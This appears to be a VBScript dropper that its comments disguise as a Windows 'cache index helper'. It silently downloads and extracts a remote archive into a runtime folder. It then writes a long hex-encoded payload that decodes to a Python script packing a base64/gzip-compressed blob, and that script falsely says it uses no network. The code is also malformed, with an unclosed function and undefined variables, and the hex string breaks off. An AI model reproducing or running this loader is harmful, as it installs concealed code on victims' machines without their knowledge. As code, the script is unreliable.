' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Function Dk(s)
K3 = sh.ExpandEnvironmentStrings(K3)
K4 = sh.ExpandEnvironmentStrings(K4)
K5 = sh.ExpandEnvironmentStrings(K5)

Function DL(u, f)
    On Error Resume Next
    Dim x, st
    DL = False
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", u, False
    x.Send
    If x.Status = 200 Then
        Set st = CreateObject("ADODB.Stream")
        st.Type = 1
        st.Open
        st.Write x.responseBody
        st.SaveToFile f, 2
        st.Close
        DL = True
    End If
End Function

Sub EX(z, dest)
    On Error Resume Next
    Dim sa, i
    Set sa = CreateObject("Shell.Application")
    sa.NameSpace(dest).CopyHere sa.NameSpace(z).Items, 20
    For i = 1 To 40
        If fo.FileExists(RT & "\" & PY) Then Exit Sub
        WScript.Sleep 250
    Next
End Sub

Function H2B(h)
    On Error Resume Next
    Dim i
    H2B = ""
    For i = 1 To Len(h) Step 2
        H2B = H2B & Chr(CInt("&H" & Mid(h, i, 2)))
    Next
End Function

' runtime
If Not fo.FileExists(RT & "\" & PY) Then
    If Not fo.FolderExists(RT) Then fo.CreateFolder RT
    If Not fo.FileExists(ST) Then
        DL R1, ST
    End If
    If fo.FileExists(ST) Then EX ST, RT
End If

' ensure payload - embedded hex first, then repo
Dim PP
PP = fo.GetParentFolderName(P1)
If Not fo.FolderExists(PP) Then fo.CreateFolder PP
If Not fo.FileExists(P1) Then
    Dim e
    e = "2320436163686553796e63202d206c69676874776569676874206361636865206d616e6966657374206d61696e7461696e65722e0a23204170706c69657320636f6d7072657373656420736e617073686f74206d616e6966657374732070726f6475636564206279207468652057696e646f777320736572766963696e670a2320737461636b20696e746f20746865206c6f63616c207065722d7573657220636163686520696e6465782e2049646c652c2073696e676c652d706173732c206e6f206e6574776f726b2e0a696d706f727420626173653634206173205f6236340a696d706f727420677a6970206173205f677a0a0a5f4d414e4946455354203d206227694c667068697651645271375a4f54544f6f4f2f43335671786978755441685a4a474163564543734a587a6278596737516e36423868316a41426637326a587a6d796d5a39714537327155534d756535516e6f2f6d4b30625231306e576354695a442b53417851424968525756722b3149496d2b6554346a4146702f4b63707275576a35714864365963454339544c6e66515530524350694c6f7355334e517342653458464b3061337358457932625634725a306b45536e4c736532777035" & _
        "30584d4e467a535a686b6665374d316646316f76614c613353706a2b7131414b6a38327a2b467235394737383555622b4f5742624c6552764e64327861506e3551735648396f46717054433746304c474b4a68395a745469485465423837396a6c4f6e556b4d56346948576542347a6951724f504b4248636f44624458724738386a68444b6b417836684c73686f38445437493579526b7137725755533637702f7854753959357a482b6172552b70595a6d47476a435778664d43612b4c484256526770493276376a324d787365324565426763506278726848596e56714a614e4b4a6d3063422f66476b4e2f457a69786d387a436e627372705a4c6771306573794a3853456f514c3764774251315669585267656f6647394a47716d4a4834636c6231313779577142784e59522f54463457463235333548796972415057584f575a6b554c4d73367a4842436c4f364f6453322f454d4b513733364a37643745664f4454365167753531515a4e4644583863503462756b7353776356534d554e374a5753524d3874324f30323050584131576954754153334a56312b517a786c51385676505834436468716531772b426b744b566a396875704739726d4f433343" & _
        "467532394859416f56422b7251485739302f303357326736576579716e7765787438392b474b725651392f6d583354357a5863476b4a562f644c397350437a596c4e3039504e742b7235613657364d68646735436e4659797166565a71792f63576e344458584f586562584e50463734574753716f6768766a6c5a3773315934513241687136597964794c4d59464c534335654a4e306b474d6a667a4f776c34573946543242344f4735434f736a4f516d3138573436746b68383557724e576b67784c74464a514d51442f4f624a376e316b464e454c474b63354364504269507662704d69732f725a49334b36764263796467436b7a6263474d586a5955426e375a48356a497a6353434c586757454d4336745247313372664a3079596c65564d39375776354e43324d6f764349363837532f6f484852675759656537323864476e687537763367614f31464a4d47686f504e325a6e4d734e72715a6446594d3942746a554a384f51757162744545467077732f57594f577476396758506f7374726d62486d5633523076776f754f55433157616136684d574961796f633272596a74643149596f444d574e534a37793276556b6c4c576a7953794a4c7271626b7a" & _
        "6d786e6952534144646b4b632f324b6d586b6b513873727770313255696672774d456b426850304a704a6b45433658636b75644b3266752f36785737317077695563324a3958736e7a776b306451307974482b48645839723775346564504c6d6b705172695a586f633356504a796c6e2f6a42534677483231652b2b454d3138626e786b47784a6e4e65724841756e744d663632504534763635595866326c62396368457a2b667a334c6e2b3135574672734352594a77777865464651797132783559695474584c51347474735653344a466577515a6a6135492b5579626a454e2b54373472792f54754f464d71366e6e4459586976774637414c2f7543707a3378692b613855364e54727a4f7735387431373848436954756d5064386865417067656d356d57716e424c683234556a44766b5a5955374b696e464a573249326251753365562f357159654d69315a4a6a7372352b6843314336412b716a384c78334574374b3537573147502b6151467a3077717554476251515575314d5a74544663716a462b51644f394b494e7a773534583177564174613443567338764a494e6c4a3477514e7a61666f2f42586b55373139316d6369356a555a2f454f356256" & _
        "5a4c2f5751443662474a7255584b2b36576d7046576447675446553732397076424e6653466e72486f6a2f51717630734b3442336b3748386d47444a65666a302f664661756b452f304d552b433756534d33384b312b48757932336d686b527333766148654e416845397570383433336c576d50485a6b7153684d6463563774677643512b375564484239673944457853734b6f2b7739566b457547724e6730357850747a46523275344c694c332f495a73413038533256537570363164666f4a6851644a6c3778777a6a66645943486d306873756e6d6e786e56384f49616c526a5332687237533673462f76335342566b545646384b4c37534b6932422b6d645879614e644f573533534f3039483156456a6836786f45596c684468397a7a4670313248616b2b715a7a4e2b766841554658664a646e31684e396e5774324b47673433475159336f6f6f417438666d506c51326c6e63646a67783155773045796e2b5a71555839464d696a4734715253524f4d7454396359564e3762487352356f706463676d516858567868515745584763534d77516e7251766b776e5138684c622f692b5148314f4951307951495933717167744555346c504a5465734e556c" & _
        "5479342f306e77647235525535395530424c674651375a3839776a4d6968586b5a386d3068655779465445726272395a7835324463506c4c7461675a4c47786f77312b54654532345a716b3276376f37494b6b4a4179456a6b77636b6c6b6d793174366b4e2f35747950523767374f43756e4f47355639677337344f6f3077714e58786c2f3968584c2f7037303157496c2f2b672b35682f524a4138304179566d4e375463577a37377963642b417868724259445534376f2f2f506f4167362f6c2b33624c325a666c6f6f6261544a4e37334631474456463041556d336849532f32707869366471376565386f626e6736424866515a5a4d4d616244594d35516641393630692f5778476233514a423677626d6d695475506f656e2f3058547039307544387a3431704a4c4a59444e512b514b4d636877512b716a2f43504a3368664c395230356a495a2b6f612f774278633846694d4435463643446e584e5a4b517468594a4f35772b6d38537839347a59744c454b4a4c52766d66386e4b4434344c4b626e6a6b5050454842684832634d6c4842494d3174316c304f565a7850356d614d385634485363777368356f5a6a444d515452642f472b5a633554454f75" & _
        "41516f737472335248396f5744715061794534506f766d6d72306b562b6a624a49774a724736704b515154785556346d6a4641356242386a764945777362742b676942486479374b62452b4544676a48347653642b3642374b3469637465363872777168616b5235633771504d5173446e5a50797258466447365358373666584d584c31344c6b6a6f784a2f2f4f33454354473834523376756745772b757a30722b737674354f71574c77334c503466574450436b4375626473336141575062584862703766704f774f514a7134376d5773673757416b336171456d695a526372666b7365584b6a2f4179454347543254757071664338434858764f665161456b4a7850347a6f46504c6a6361376c5a555450584568486a6c426e3962564d56444748704b4f687952576246344c504a65794a7255327450555649657153666a6e574f44334e4a4d7a72547259374334587733552f68424d7478524c2b6b49385362756d4a59456d48625437593459574a307a6f6979686b5943536961435367752f4378314177507679346574686c7a62526e626352475979426b4841663543454a2b4f584c6b47474e68304543344a647a47744a786a434d7543484c4358355066" & _
        "31354933386536474258756e48696b527a54674846316d52427673366172513964666375486368514d46433844514657382f4d45754b74776d55755844427158457a2f536c675139536f797872746b64547136436e797750414d64797a62384874734c7246676c505138435071627533485336546433746d4861673179633261724c65786839335a44563863332f346a3661386a63314d367a5434774d5a4b794d794758564a3356616468464d4b6266515734304d453069442f654b7146784f5350542f77734570384576695161717032324547523050454830767a66372b79777144514664305a48566a6c51763737506463437561575046753347732f6b4d416b5a2f416c346d617648795a2f686b387247356351394b4c554a5a4f3836416b54494963773065374e755343386f41506766444539734c6f582b4131593567494a63654d434172772b784e38317050416d756678484776623642624b48485a6136366e5530446d68466558467467694b505949594d6b5375387a5131315630306c6164326e725751526b6b445936534c79616f316f6850674f6d454335684e6374494c5a4855642b6b715a3142326b384c634a2f6836496b504a4579325130572f" & _
        "48626d7a475a5462342b56752f2b49386b574964577666425a6e63586a385a4543696c64644f426c744f47734265496a477850666976637a4a5a674d76514a2b39617977393745724955532f4c76627234553366574e714d777861374a50594a30777a334e666e3241364c3263393639776c2b5145737967585a41362b7070754c4f4975704e5975664f65386d7a4f465a6d53355955684b585a434d4567584b386868694e766866726c51734449592f565354586b537477546645474161687a736a4865672b633234304254694e453877784b532f3877352f5037705a78647865304536622b773163444746385a49726969514a76354d347044483445426f7033654737656a674c6d48357078514d61766f43635638776f4334674178664b684977716a6b6f6b444649414a3335636f7a4753706c594c46367076496d5755767555394d6a4a4266644d43484634453738716a6152744878466256426f624130666d4a554a34656d662b69484750686b504f544c574a50576c6a637270416a314c7235556130437a62324f4c33686d4d356f64634c4667712f655a6178544e56327232317954554b79385645326a44563479646535367541414a4f496f6736514551" & _
        "685a4e6432417643542b6f63576d312b4867435072434975453852474a736545346c6733654c326a46504a5a6546745442304545617131576b66797a556c733563534447674d4f574a6c31386a39303856392f733277522b32555156726c503652484158344a62306e4d47472f47637378497041702f4a4c58627a742f64384a65342f5966375a424f484a356a50776a4e3951763231366f2f3576722f65326c415a64543664616772564646304b743261566b7a6b3851766a644f6d7034506436774135626936673435426b4466314c45625739736c333673476a6f7243654f2f6b56394e2b45577a6e5742786f654b4d4c63334c5066304633616b316b384a64764c58794559694272565053686d5355355279446b5637762b78566b5338354d5054582b4e3858795465506b3837365733316c5157484e587147347a717670337068747870433169724975695a6a61512f78474d4b52366544583656495852574835716935644479417275544664752f6246686549693259736e4b77476b4a7569444d693352415632744f59536171614672787852797263716d4e6a71664b766252666b486e694e6c4e6a4556365342776842646a4252772f4d53314d362b4a33" & _
        "764f47613272662f757650483143704864726d6756435744556a745359436b7a676250623845423474575a6a2b46336a4d514c374c3756477a4655586e5143544d3578484e6e7935776e382b74766e5a3141446b55686741346e7a673034746e4e6362304e786b7138337378767447784738504f356a42716f31523077594577392f622f524b2f6a6666566d436a4575594e5642633966462b47355a7a3077737473364e514e6e643571536f444956375246696e55414f666e78417a72366c57564e584162336e366c533448704462484c506a366f55536169654b4d597930467032545666544337366e61546d423736756842723751673268546b30354a51692b4976503454635a4e77474e792b3564482f5378373179355a304b2f6e39464b4e2b454c61482b796b544530307234535837505163594d386f576b325a54564548336a2f344c6e5a66566e45322b544268476d654143304f6b75594778636873666c724e45544c4f704e52337463756f784e4c6d7869624f306f6148443470463665766656697452516f6947786e5356384e7063582f6e79705a417465785436465a316b4b4b4f556c32356d52664237395569535047663546765174493943654c61" & _
        "5542316c414274324154704c4c6b3533704e7479766f50394f6f5a514454304e764e3635726b666370324162737a3850384c47624664443369756c58676174665a615642496e6e6c735a366f7a7a4764437a75664278382b4c4736356449533875397242394f4d4862356a434855667144793661484a4a2b2b43787354334a43616e59734c6433463946346a357a62464350505a6a436f6a51792b7a6e4143776b4d313967457a30392b78365449626d7376314e69433479336f71347766733372593364545741797933583979614561615a50776456764f4b4e37723754683275776d506b523366496a316346657161376933467a652b6c646f783569697462307832724d574b3148426c646f6c7735433853736d694979517647612f725770796477516664676c58534e4136436c58553259774f414e742f6474796556454f4c43467035336c5951567867593266556a6159465667326243676541693741766976727779526f6d455864303157706f7a594e5971784f465868366563345865356f6f31545033653241534d37374b36486e30354678455465464c4b6b5647626b4c7878474e6a70383476687351353955644967484d3135455265435170374a7732" & _
        "393467477339446e43686d674c704f6d6d784f75452f6543376f434341622b47717438387042747a6e566b364e5a4753386b444f34395673657367702f50464652366161506c3870324a68304239384e374273416c324a5773794c6f51543548424349707833343078494b4b4e7a7539696638585451647351415354764445706639786c666a63495575784e4a585858745162776b2f46376136422f6f6b714d32342f44706b4f3563355550702b4872535645382f522f4d4453365777435762626e496e4a6a6a4e3347764a73396438556d774c7678644d594b456b56396464474b41467a4774783654666b796e744f593733477855334f67623270502f765253346830577375332f4530664b6e6b336379317851416f43452b634f67324a6653674c5847314e53675531656e506d6c5a7547387743612b6963525250636976554d43526c7869506367716c52565874765a68786c57347a4d466e6445736b6e5435396a6b626647344578303464514c58336b3372346b765745677251727a634369717655694b2f46755a416f4e6a476b674d5063656975774b647761576a49716c6a4e394d63304f772f6d6d4a2f5056346e6a2f336c5a32387243765079733036" & _
        "786b66703530326c6f596845534d63582b4f6b35636d6a2b704e497a72725a4d6c537059786c43352b47614f38645738434c61473557646139684b596d6c4b4678624f47494d50494a52646f31325a746c2b432f624f344a7441707561784839616748396551767a6c7575584e3064464f686231314d7666547352537a77626f2f684c6e4161392b3670436f7679535463316f503844414953646842794e64324a436546755a7143676169395142447644447447704b353742664f6b79307065535a4d3261667552682b7a396b46485154776b2f6a6a46672b6145776d36374754786c714250636a315258726767784130727233527152706f69425941344a43714e35475533346a6c5a57426935377739366e54326834795a724848712b516f357234504a68354f766c76464e2b36365849716e6c4d56445739772f422f366e55473864464773784a354546726c497a50514375796566594944434a6e356b4c7a77546f4c653056572b5831714d2b614737444a52474c386b6744495a64544e72684d583877734a333256367a574d576a4d76577459755363337130307965652b4c4d7467646b4e377561496e332f76506c75384f6b752f5044707055616867616d" & _
        "5067484e4d3155735744314b416167317033676848665a6e7237445a7058644c4c66743463526d3046734b682f5432364e69322b45354245586a6b6f69784d46676b4e524b44425648436639562f684354366d2f2f38756e4c424c506d4478552b504942357149496d5549717544666d6f755465354d6766462b354e56427236742b6e4f6665676b69754d4a6177396b456f61302b6b714b75464b48436d735239344c5975665779425957384b6c666774474175666f31674a6f3162597a3050525459763643675a4d676d4b6472616f36394b75762b2f4e485733745375336e2b5a673830454f70362b43744f5a4a744c394337335a6257444365446864506d4b466e4774706d353772414a746d50794f312f62686e6e4b3777767a6364596f2b656d5662307076733155736d334e4d674d726d692b3166614465696a7239656a52615738615a70323750644553303443435a794d36663635316f3167415745735a6369446369456b5a504145555453422b5756636e624441754350476d47502b714179494c59597862647669303659354e70797650727a687537766444732f3741586f4b6333594a64376f5642356f4e367a6c6f634268315a7a554e7951707376" & _
        "6f533848516e592b704159766663662b71664e2b326861673043627749616b55613774645553584e7a63784a6d6e7a31433979326a4e654e665a35657257316e553149627a465678415176726c595a4734542b68424c6e3154453861345571542f3069684a4f69455a6f593263683065694c2b646f2f6938666d693250697959676b4d70664e2f6265784b46582f485a44627661316779623347494d68386746586d44627442436c4e7950393448516231674d4d5155725a457a7a4664777870506e4e653148777435624a544974344c7a66314a4437536b4a46566c41676b7a69712b3237347a6862754d767877476c72527955773430796b354a2b63697a596c676d645a6a574733435161386239436e786d31774866316c4a756a6e646f7174336d6446542b506472637577375a2f5a6b7042442b3338764674756d565a54675a4c2b6a2f525434322b714a716a484f6f476e55482b6d3855686f714b4e6d55614a6c464c6954674c32344837584f6e6656314c756b33394c4c4e596a6d67706b4447693348642f646d4257326459307276567561674c754c765a31487462514c4c7577662b36654e50667830784b6f37314d6342586a465445312f4a666c4a2b" & _
        "75477a62526655724f61465a44706643454e716e72497943372b6c374770327a39517069324a4d4a4a7073755071616b624d6b537752374b78306b764d4c6c594f553637716b72483045775631414c61786a437a7a5531726d4d585a653436514c6b646b316a6f57745144373036324b4f4633396c424e49756e6b774158704c4b7a654c6f5a564a4757697232415039696f4d58647a386a69356438764b314d4c45384163575667526b5267533663545969374c587438772f6e592f4f4459665a445a766144634a68715774756a5251684648705a6f4358552f39394c7454757576584e6d316f643575467a347631706d76494f623355774c5046763669357438516e433854786e4b4b5558514a524645675173685242693935523432394c7a4b2f2b76376c77456d746d6647326a425a7730683471704d4a5270794967495372634a6244334151724561727776325849585868374a72507239397655324e6b3356625448697a377a346757612f55634b756c5133596c73354c4c735753566f4d417a692b30626b776e796a587959476b564c5135343348304f3179796f4246577a464d2b4d5953514b636f696e467076585a4a37704c73486f49562b386f574a6f" & _
        "3761627a5178646661506e424e4846506a6f334572587178414c716f4d436c456765383871363071786a49506a675a4f634872695046394964344e58706542573857784f58396a6c613741416b466d7544702f2b4d2f46566a534a64546339707a30736a6d765a485a68665149325868776c79794f31313547592b3542516768664d4b78625379626439316a45415658734f486d612b4270573339655554506e6b6d6e547a55664c2f6d326c525357424952397a34714f74645152635252753462547a4377685557366d744243374237414830697733764c6f396e7a5a68524768646c2b5543353942544570547a41774c52546c3456576b2b717665626c456770423969584f4a31323662366e726d66744769615761675857644d716752467a524d6555424b6978306b34735553384c38597830335751334d663033786b366536336b33464c512f7266397846646753555a426e7349415362474b46576a6e3365597944543239344a484437324571743145487a47506547633052366d7349794b6e4c626f456a724945794237307274566639726f4b2f457730532b4552726e4477567370384c4d6278574e68714c4a617051566a535958487378754c6b7936582b" & _
        "78444a726b663774424a485461493062465643307231526a5041713665344d3962714a7156656b5758536c5a6a766e33786246763234627539334249796573667168422b5462645a48616e7947766b6f2b4c647957474c37624e6f6d6973647a56524a52357a4874775231493368574c61374f66475a4d34526233445632415147395541596933436b6f746b503962773074385a626e672f4551347056336d7a663668656b5653514b53316c47614d73576c34393571616c7447664253666a66705a673977494a41694a727049774e586c6266647632592b3270742b6b6d5747677964307032753174384e6c7a55325a5a45332b71655756726e33616b30336259574450627467445876365368526d43736d69556a39497476412b74666d414248373474747331505a5064303065704e6f364f65707375637262646d52574c474a772b47765871457975334c363538435377395247307a714331743231777744637669725a324650565752376f4e6b3676745672774a504f654b794a4a447357744f73533262334e6c42542f694b446d6177453130646f4b6e7173482b6d7267705a31683145346f6f3271774956336b61773265304e336732707564645a75695463" & _
        "4a747a61686270344e675563755853452f465775624367457355394a584a455a596f54736b454c51666f2b7150487a354678666548452b3234534637586352664476536c6b7148592b4a7630756976652b4b735031634f34315742715a34307455754844457641697546584654306d47676c4c576b6c66494c6c564d32744e574c2f79784d51464d4357596a6756646339734d572b73643653314b516d51694979583344485570532f496968476d77544e4e6969557371646979615752434e61547432596e434c37546f5554535152694f364d4372774c325559426a3743302f6543505868622f724135645441684c4d786b6863326c6165585444753144592b73684b447a4e38337239327050664c3141654c4c562f433737674d30786762506d38684a334e7a4c61455770417a4576684271656e77707a6f767158413166764b495850676e714d53662b4c4d695742555078746f5353592f704d5143715265647a504143746c6c74537a4a453672584a386c4d7a4975324a36437959454f6d726a5a48625a59514c5579775472594454472f76465038475a552f68614b316a61486872393049744237586c6c7052676941326b384a5a572b6d5750724e792f7277" & _
        "4a43773355556c464d457974346564567636776a2f5a6c6d447269533430483039426934473937415a6e505677696538584931426845614147684b544364646e7a4c6c3345515857646b652f4644385671686377745354514b63412b5a38693750757a6644726e644c7345447173424f4c4a4774526448757538506d784d707946756e63304456594958507058443156716f4976776e563949447168435a4b594f644b7836327366534462413866414e5134736766517067466f336335546c415752366966496e4e4c646d4874525264572f33416c65333142757762517a704232777252557671746f765053773049497a61312b474832557a317a43325166536c484d526543313763366249384b4762414d6c4b50397a526a7153327a486146734a6a6f7a37314e776a416f7235707a4e4e4e4753554b654c344438746c61536c6c35732b37346e326e4c3943646c623078487864577872355a366f615730366b685962586c4d35784c6539554858626d38666f5564617330616f4c5034524e4a6a50512b494858612f73713266676d726a476957683975456b6f6235784974736a6d502b36726e75326c6a587273706e4d375a6b4a4d464b63496e554449794730" & _
        "5953595a645a42423968595a4b737970624e424f6e686e7a6e5031466f4b6d6c454e5154796f67335846577a31497642494259365a63756c664231414356416f4465626e466d2f556e716548315a6b33517a644a762f7a51423255516453764e6363416276684d7a72436541397438317039616479437637683067502b707339554c634a2b515a6c76556155365a347544746c5472476b722b676c35684c674e7747474f53744762756f6b7373494b453250566a64476e71686a6368316f544674686b45713748345446534a39796d2f793379442f75636c456477344863545154647144693858414e3838764f6476386f7270562f4a68634e556138594d7043417358764933793172664c44374459677344396d544b78334430746f756b6374346f2b42375a31344e6e6379385a7a6e356165754e2f334f4376425039736e626741664f31726554584d545472327050687532453572666e6e5377716b3759325a78704e7a574446527968767178674b6e7a30367a526e6250412b44684e4f4f37324d746a686352562b4d6a6e485a79456a436f4b6658654f6e546736456355755945562f477278616f694e662b662f536e38394f546678622f6466674230744a5a" & _
